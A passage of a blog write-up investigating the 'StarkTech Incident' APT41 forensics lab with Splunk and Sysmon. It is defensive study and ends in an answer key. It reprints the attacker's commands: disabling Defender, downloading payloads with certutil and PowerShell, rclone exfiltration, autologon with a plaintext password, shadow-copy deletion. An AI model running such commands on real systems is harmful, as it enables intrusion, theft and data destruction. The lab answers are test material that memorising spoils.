+                     data-src="/images/stacktech/monitoring2.png"
+                     
+                ></p>
+<p>The two scheduled tasks was configured to run the AteraAgent tool.</p>
+<h3 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h3><p>Between 13:45 and 14:00, the attacker established persistence by installing multiple RMM tools (AteraAgent, Splashtop, and AnyDesk) to maintain long‑term remote access. Persistence was reinforced through scheduled tasks (AteraAgentServiceWatchdog and Monitoring Recovery) configured to automatically execute the AteraAgent service.</p>
+<h2 id="Defense-Evasion"><a href="#Defense-Evasion" class="headerlink" title="Defense Evasion"></a>Defense Evasion</h2><p>During the analysis of commands executed by <code>iexploreplugin.exe</code>, it was observed that the attacker attempted to disable Windows Defender real-time protection as a defense evasion technique.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring</span><br></pre></td></tr></table></figure></div>
+
+<p>This command disables real-time monitoring, allowing malicious activity to proceed with reduced detection and increasing the attacker’s ability to maintain access and execute follow-on actions undetected.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/disable.png"
+                     
+                ></p>
+<p>Note: In the image we can see that this process executed a vbs script.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe C:\Users\t.leon\scvhost.vbs</span><br></pre></td></tr></table></figure></div>
+<p>I am sure its malicious but I dont know what it is doing so I will back for it later.</p>
+<p>Additionally, during the initial access phase, Sysmon Event ID 8 (CreateRemoteThread) revealed that <code>iexploreplugin.exe</code> injected into other running processes. After filtering for this event, it was confirmed that the malware accessed both <code>notepad.exe</code> and <code>spoolsv.exe</code>, indicating process injection.</p>
+<p>By migrating into these legitimate processes, the attacker aimed to hide malicious activity, evade detection, and blend in with normal system behavior, a common defense evasion technique, we need to discover why the attacker used these two processes and how (I will cover this later now we need to save the Process IDs for them).</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/eventid8.png"
+                     
+                ></p>
+<p>spoolsv proccess ID: 3016<br>notepad process ID: 14956</p>
+<h3 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h3><p>The attacker used multiple defense evasion techniques, including disabling Windows Defender real‑time protection and performing process injection into legitimate processes (notepad.exe and spoolsv.exe) to conceal malicious activity. These actions reduced detection visibility and allowed the malware to blend into normal system behavior while maintaining execution.</p>
+<h2 id="Credential-Access"><a href="#Credential-Access" class="headerlink" title="Credential Access"></a>Credential Access</h2><p>Now we know that the attaker Injected two processes <code>notepad.exe</code> and <code>spoolsv.exe</code>, while I am seraching for any Credential access techniques I used this query to find what processes accessed <code>lsass.exe</code>.</p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=10 TargetImage=*lsass.exe earliest=1756128800 | table _time SourceImage SourceProcessId |sort _time</code> </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/lsass.png"
+                     
+                ></p>
+<p>The attacker targeted the <code>lsass.exe</code> three times, first two attempts was using <code>iexploreplugin.exe</code> and last one was using <code>spoolsv.exe</code>.<br>last attempt was in <code>2025-08-25 13:56:54</code></p>
+<h3 id="Summary-4"><a href="#Summary-4" class="headerlink" title="Summary"></a>Summary</h3><p>The attacker attempted credential access by targeting lsass.exe multiple times, indicating an effort to dump or access stored credentials.</p>
+<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>Let me ask you a question: Why does the attacker need to extract passwords from lsass.exe?<br>Of course, it’s to use them to gain higher privileges and expand the scope of their attack to more than one device within the domain,So lets discover if the attacker accessed anothor accounts or machines.</p>
+<p>I will use Security Event ID 4624 to find succefull login attempts to FILE-SERVER and DC01. </p>
+<p>Query 1:<br><code>index=* host=&quot;FILES-Server&quot; EventCode=4624 src_ip!=&quot;-&quot;| table _time, LogonType, Target_User_Name, src_ip | sort _time</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/logonfile.png"
+                     
+                ></p>
+<p>we can easelly confirm that the attacker accessed account <code>admin123</code> after dumping the hashs from <code>lsass.exe</code> and logon to File-Server using this account. </p>
+<p>first logon at <code>2025-08-25 13:58:52</code> with <code>LogonType=3 (network logon)</code>, <code>TargetUserName=admin143</code>, and <code>IpAddress=10.10.5.62</code>. The source IP 10.10.5.62 matches the attacker’s infrastructure.</p>
+<p>Query 2:<br><code>index=* host=&quot;DC01&quot; EventCode=4624 src_ip!=&quot;-&quot; earliest=1756128800 | table _time, LogonType, Target_User_Name, src_ip | sort _time</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/logondc.png"
+                     
+                ></p>
+<p>the attacker logon to the DC with the same username and source IP,first logon was at <code>2025-08-25 14:34:30</code></p>
+<h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p>After dumping credentials from lsass.exe, the attacker used the recovered credentials to perform lateral movement by successfully authenticating to both the File Server and the Domain Controller. The successful network logons (Event ID 4624) using the admin143 account from the attacker-controlled IP 10.10.5.62 confirm credential reuse to expand access across the domain.</p>
+<h2 id="POST-Lateral-Movement"><a href="#POST-Lateral-Movement" class="headerlink" title="POST Lateral Movement"></a>POST Lateral Movement</h2><p>At this stage, we focus on the attacker’s activity after gaining access to the File Server and Domain Controller (DC01).</p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=1 earliest=1756128800 (host=&quot;DC01&quot; OR host=&quot;FILES-SERVER&quot; ) AND NOT chocolatey |  table _time Image CommandLine ParentImage ParentCommandLine SHA256 host |sort _time</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/postex.png"
+                     
+                ></p>
+<p>Using Sysmon Event ID 1, we observed that the attacker began enumerating the File Server shortly after successful authentication. Shortly after, PowerShell was used to download a ZIP archive and store it in the Downloads directory.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  -c iwr -uri http://10.10.5.171:8883/python.zip -outfile C:\Users\admin143\Downloads\python.zip</span><br></pre></td></tr></table></figure></div>
+
+<p>The attacker then extracted the archive:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  -c &quot;Expand-Archive -Path &#x27;C:\Users\admin143\Downloads\python.zip&#x27; -DestinationPath &#x27;C:\Users\admin143\Downloads&#x27; -Force&quot;</span><br></pre></td></tr></table></figure></div>
+
+<p>lets see what is the files that was in this zip file.</p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 earliest=1756128800 host=&quot;FILES-SERVER&quot; TargetFilename=*Downloads\\python* | table _time TargetFilename |sort _time</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/post2.png"
+                     
+                ></p>
+<p>Analysis of file creation events showed that python.zip contained two files: testc.exe and python311.dll. After executing testc.exe, two additional files appeared in the Downloads directory, indicating further payload execution.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/post3.png"
+                     
+                ></p>
+<p>ok, lets complete our analysis.</p>
+<p>Later, at 2025-08-25 14:17:04, the attacker compressed sensitive files into a single archive:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell  -c Compress-Archive -Path &#x27;C:\Shares\Shares\Finance.csv&#x27;,&#x27;C:\Shares\Shares\HR.csv&#x27; -DestinationPath &#x27;C:\ProgramData\Teams\teams-skartech.zip&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>At 2025-08-25 14:25:03, the archive was exfiltrated using the remote synchronization tool rclone, uploading it to a remote storage location named starktech-backups.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramData\Teams\rclone\rclone-v1.71.0-windows-amd64\rclone.exe copy teams-starktech.zip remote:starktech-backups</span><br></pre></td></tr></table></figure></div>
+
+<p>all these activites was in the File Server, bSubsequently, the attacker downloaded multiple scripts and modules to DC01 using both PowerShell and certutil:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;Invoke-WebRequest -Uri https://raw.githubusercontent.com/muahmmedshahblis/blabla/refs/heads/main/crypto.psm1 -OutFile C:\ProgramData\crypto.psm1</span><br><span class="line">cmd.exe /Q /c certutil -urlcache -split -f https://raw.githubusercontent.com/muahmmedshahblis/blabla/refs/heads/main/script.ps1 C:\ProgramData\script.ps1</span><br><span class="line">certutil  -urlcache -split -f http://10.10.5.171:8883/up.bat C:\Users\Public\up.bat</span><br><span class="line">certutil  -urlcache -split -f http://10.10.5.171:8883/dhsf82.bat C:\Programdata\Microsoft\dhsf82.bat</span><br></pre></td></tr></table></figure></div>
+
+<p>The attacker then executed <code>dhsf82.bat</code> using PowerShell with execution policy bypass. This script modified registry keys to enable automatic logon, storing the plaintext password CyberNight!128.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell  -ExecutionPolicy Bypass -File C:\Programdata\Microsoft\dhsf82.bat</span><br><span class="line">reg   add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultPassword /t REG_SZ /d CyberNight!128 /f</span><br></pre></td></tr></table></figure></div>
+<p>then he deleted all shadow copies in the <code>DC01</code>, so i think he is preparing for deploying ransomware or the scripts will be used for encryption purposes</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin  delete shadows /all /quiet</span><br></pre></td></tr></table></figure></div>
+<p>Finally, a text file named Recover-Files.txt was downloaded to the administrator’s desktop. Although the file was not present in the triage image, its naming strongly suggests it was used as a ransomware note, indicating preparation for or execution of an encryption stage.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil  -urlcache -split -f http://10.10.5.171:8883/Recover-Files.txt C:\Users\admin143\Desktop\Recover-Files.txt</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Summary-5"><a href="#Summary-5" class="headerlink" title="Summary"></a>Summary</h3><p>After lateral movement, the attacker performed data collection and exfiltration using PowerShell and rclone, targeting sensitive files on the File Server. Activity on DC01 indicates ransomware preparation, including script execution, credential persistence, shadow copy deletion, and the deployment of a ransom note.</p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This analysis was done before reading the questions, as I focused on investigating the attack end-to-end. While most activity was identified early on, a few important details were discovered later while solving the questions.</p>
+<h1 id="The-Questions"><a href="#The-Questions" class="headerlink" title="The Questions"></a>The Questions</h1><h2 id="Intial-Access"><a href="#Intial-Access" class="headerlink" title="Intial Access"></a>Intial Access</h2><blockquote>
+<p>The intrusion started when the victim accessed a suspicious URL from a file-sharing service. What was the name of the website that triggered the compromise?</p>
+</blockquote>
+<p>Answer: <code>paste.sh</code></p>
+<h2 id="Execution"><a href="#Execution" class="headerlink" title="Execution"></a>Execution</h2><blockquote>
+<p>After visiting the site, the victim ran a PowerShell command via Run. What’s the full URL of the file downloaded and executed?</p>
+</blockquote>
+<p>Answer: <code>http://10.10.5.171:8883/iexploreplugin.exe</code></p>
+<blockquote>
+<p>A malicious zip file was extracted on the Files Server, yielding two files. What are the names of these extracted files?</p>
+</blockquote>
+<p>Answer: <code>testc.exe,python311.dll</code></p>
+<blockquote>
+<p>When one file from Q3 was executed, two additional files appeared on the host. What are the names of these dropped files?</p>
+</blockquote>
+<p>Answer: <code>ws2_32.exe,system_module.exe</code></p>
+<h2 id="Command-and-Control"><a href="#Command-and-Control" class="headerlink" title="Command and Control"></a>Command and Control</h2><blockquote>
+<p>Network logs reveal an outbound connection from the payload. What’s the attacker’s IP address and port used for the initial C2 communication?</p>
+</blockquote>
+<p>Answer: <code>10.10.5.62:8080</code></p>
+<blockquote>
+<p>The attacker connected to a secondary command-and-control server. What’s the domain name of this C2 server?</p>
+</blockquote>
+<p>Query:<br><code>index=* host=&quot;FILES-Server&quot; EventCode=22 | search Image=*ws2_32.exe* OR Image=*system_module.exe*| table _time, Image, QueryName, answer| sort - _time</code></p>
+<p>Answer: <code>agegamepay.com</code><br>the IP for this domain was <code>10.10.5.245</code></p>
+<p>The <code>ws2_32.exe</code> file was connecting to this C2 after running. </p>
+<blockquote>
+<p>Executing the files from Q4 triggered connections to the attacker’s C2 server. What are the two ports used for these connections?</p>
+</blockquote>
+<p>Query:<br><code>index=* host=&quot;FILES-Server&quot; EventCode=3 DestinationIp=10.10.5.245| search Image=*ws2_32.exe* OR Image=*system_module* | table _time,Image, SourceIp, DestinationIp, DestinationPort | sort - _time</code></p>
+<p>Answer: <code>8443,8083</code></p>
+<h2 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h2><blockquote>
+<p>During persistence, the attacker leveraged integrator credentials for remote management software. Which credentials were used to link to their account?</p>
+</blockquote>
+<p>Answer: <code>bunionsneaker.4m@gmail.com,001Q300000VzBKuIAN</code></p>
+<blockquote>
+<p>The attacker installed three remote management services for persistence. What are the names of these services?</p>
+</blockquote>
+<p>Answer: <code>AteraAgent,SplashtopRemoteService,AnyDesk</code></p>
+<blockquote>
+<p>Installing the remote management tool from Q9 created two scheduled tasks. What are the names of these tasks?</p>
+</blockquote>
+<p>Answer: <code>Monitoring Recovery,AteraAgentServiceWatchdog</code></p>
+<blockquote>
+<p>During the persistence phase, the attacker created a shortcut to ensure malicious code execution. Which script was responsible for creating this shortcut?</p>
+</blockquote>
+<p>Answer: <code>scvhost.vbs</code></p>
+<blockquote>
+<p>On the domain server, the attacker configured automatic logon using a user’s credentials. What is the password used, and what is the name of the script responsible for this configuration?</p>
+</blockquote>
+<p>Answer: <code>CyberNight!128,dhsf82.bat</code></p>
+<h2 id="Discovery-1"><a href="#Discovery-1" class="headerlink" title="Discovery"></a>Discovery</h2><blockquote>
+<p>During reconnaissance, the attacker enumerated domain accounts. What’s the command used to list all domain users?</p>
+</blockquote>
+<p>Answer: <code>net user /domain</code></p>
+<blockquote>
+<p>The attacker, during reconnaissance, ran an enumeration tool via C2 after migrating to another process. The tool then generated an output file on the victim host. Which process did they migrate into, and what zip file was created?</p>
+</blockquote>
+<p>Answer: <code>notepad.exe,20250825133552_BloodHound.zip</code></p>
+<p>I missed the file name but we can solve it easily because we know which processes injected, just we want to see file creation activities.</p>
+<p>Query:<br><code>index=* source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=11 (ProcessId=3016 OR ProcessId=14956) earliest=1756126833 |table _time TargetFilename| sort _time</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/stacktech/blood.png"
+                     
+                ></p>
+<h2 id="Defense-Evasion-1"><a href="#Defense-Evasion-1" class="headerlink" title="Defense Evasion"></a>Defense Evasion</h2><blockquote>
+<p>To evade detection, the attacker disabled a Windows Defender feature. What’s the full command used for this?</p>
+</blockquote>
+<p>Answer: <code>powershell.exe -WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring</code></p>
+<h2 id="Credential-Access-1"><a href="#Credential-Access-1" class="headerlink" title="Credential Access"></a>Credential Access</h2><blockquote>
+<p>The attacker managed to dump hashes on the DESKTOP host. What is the process they migrated to before dumping the hashes?</p>
+</blockquote>
+<p>Answer: <code>spoolsv.exe</code></p>
+<h2 id="Lateral-Movement-1"><a href="#Lateral-Movement-1" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><blockquote>
+<p>During lateral movement, the attacker accessed the file server. What’s the username used for this access?</p>
+</blockquote>
+<p>Answer: <code>admin143</code></p>
+<blockquote>
+<p>Determining the timestamp of lateral movement to the Domain Controller is key for attack analysis. When did the attacker successfully access it?</p>
+</blockquote>
+<p>Answer: <code>2025-08-25 14:34</code></p>
+<h2 id="Collection"><a href="#Collection" class="headerlink" title="Collection"></a>Collection</h2><blockquote>
+<p>The attacker compressed specific files on the compromised file server for exfiltration. What is the full path to the file where the attacker saved the compressed data?</p>
+</blockquote>
+<p>Answer: <code>C:\ProgramData\Teams\teams-skartech.zip</code></p>
+<h2 id="Exfiltration"><a href="#Exfiltration" class="headerlink" title="Exfiltration"></a>Exfiltration</h2><blockquote>
+<p>The attacker used a tool for syncing files to cloud storage to exfiltrate data from the compromised file server. What is the name of the specific folder or path on the remote storage service used for exfiltration?</p>
+</blockquote>
+<p>Answer: <code>starktech-backups</code></p>
+<h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><blockquote>
+<p>The attacker downloaded two scripts to the Domain Controller to attempt file encryption. What are the names of these two scripts?</p>
+</blockquote>
+<p>Answer: <code>crypto.psm1,script.ps1</code> </p>
+<h1 id="Conclusion-1"><a href="#Conclusion-1" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Thanks for reading and I hope you learned something new from my writeup. </p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> CyberDeefnders: StarkTech Incident - APT41 Lab</li>
+        <li><strong>Author:</strong> Mustafa Al-Zaareer</li>
+        <li><strong>Created at
+                :</strong> 2026-01-27 09:15:15</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-01-27 15:24:36
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://mustafaalzaareer.github.io/2026/01/27/CyberDeefnders-StarkTech-Incident-APT41-Lab/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/01/26/0xL4ugh-CTF-V5-Forensics-Writeup/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">0xL4ugh CTF V5 Forensics Writeup</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">CyberDeefnders: StarkTech Incident - APT41 Lab</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Introduction"><span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Scenario"><span class="nav-text">Scenario</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#My-Analysis"><span class="nav-text">My Analysis</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Intial-access-and-Execution"><span class="nav-text">Intial access and Execution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary"><span class="nav-text">Summary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Discovery"><span class="nav-text">Discovery</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-1"><span class="nav-text">Summary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Persistance"><span class="nav-text">Persistance</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-2"><span class="nav-text">Summary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Defense-Evasion"><span class="nav-text">Defense Evasion</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-3"><span class="nav-text">Summary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Credential-Access"><span class="nav-text">Credential Access</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-4"><span class="nav-text">Summary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lateral-Movement"><span class="nav-text">Lateral Movement</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#summary"><span class="nav-text">summary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POST-Lateral-Movement"><span class="nav-text">POST Lateral Movement</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Summary-5"><span class="nav-text">Summary</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-text">Conclusion</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#The-Questions"><span class="nav-text">The Questions</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Intial-Access"><span class="nav-text">Intial Access</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execution"><span class="nav-text">Execution</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Command-and-Control"><span class="nav-text">Command and Control</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Persistence"><span class="nav-text">Persistence</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Discovery-1"><span class="nav-text">Discovery</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Defense-Evasion-1"><span class="nav-text">Defense Evasion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Credential-Access-1"><span class="nav-text">Credential Access</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lateral-Movement-1"><span class="nav-text">Lateral Movement</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Collection"><span class="nav-text">Collection</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exfiltration"><span class="nav-text">Exfiltration</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impact"><span class="nav-text">Impact</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion-1"><span class="nav-text">Conclusion</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Mustafa Al-Zaareer</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        2 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
